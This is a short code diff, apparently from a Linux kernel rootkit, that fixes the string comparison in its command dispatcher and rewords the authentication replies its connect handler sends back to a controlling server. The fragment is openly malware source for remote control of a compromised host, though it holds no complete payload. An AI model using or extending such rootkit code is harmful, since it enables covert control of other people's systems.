@@ -97,7 +97,7 @@ int rootkit_command(char *command, unsigned command_size) {
 
     int ret_code = -EINVAL;
     for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
-        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size - 1) == 0) {
+        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size) == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
             while (args[0] == ' ')
                 args++;
@@ -135,11 +135,11 @@ int connect_handler(char *args) {
 
     if ((is_auth = are_hash_equals(passwd_hash, hash))) {
         DBG_MSG("connect_handler: user authentificated\n");
-        send_to_server("connect_handler: user authentificated\n");
+        send_to_server("User authentificated\n");
     }
     else {
         ERR_MSG("connect_handler: error while authentificating user\n");
-		msleep(2 * TIMEOUT_BEFORE_RETRY);
+        msleep(2 * TIMEOUT_BEFORE_RETRY);
         send_to_server("Error while authentificating.\n");
     }
     return is_auth;
